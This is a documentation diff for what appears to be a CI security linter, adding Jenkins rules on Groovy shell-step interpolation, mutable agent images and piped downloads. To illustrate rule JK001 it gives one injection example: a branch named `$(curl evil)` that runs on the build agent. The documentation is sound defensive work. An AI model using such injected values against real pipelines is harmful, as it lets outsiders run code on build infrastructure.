@@ -343,6 +343,29 @@ are *documented* as moving references, so the registry hands you whatever was
 published last. That is a supply chain you do not control, written down in the
 file.
 
+## Jenkins
+
+| Rule | Finds | Severity |
+| --- | --- | --- |
+| JK001 | Groovy interpolates outsider text into a shell step | critical |
+| JK002 | Agent image can point elsewhere tomorrow | medium |
+| JK003 | Shell step pipes a download into a shell | high |
+
+A Jenkinsfile is a Groovy program and this tool has no business parsing one.
+What it reads is the shell steps, which is where a pipeline's security
+decisions live.
+
+JK001 turns on Groovy's quoting, which decides whether an interpolation is a
+bug at all. `sh "echo ${env.BRANCH_NAME}"` is interpolated by *Groovy*, before
+the shell sees it, so a branch called `$(curl evil)` runs on the agent. `sh
+'echo $BRANCH_NAME'` is a single-quoted string Groovy leaves alone, so the
+shell expands the variable and never parses the value as code. The two lines
+look nearly identical and differ entirely, which is what makes the rule worth
+having and what makes a reviewer skim past it.
+
+Everything here is line-based. A pipeline that builds its commands through a
+helper function, or a shared library, is invisible to it.
+
 ## Terraform
 
 | Rule | Finds | Severity |
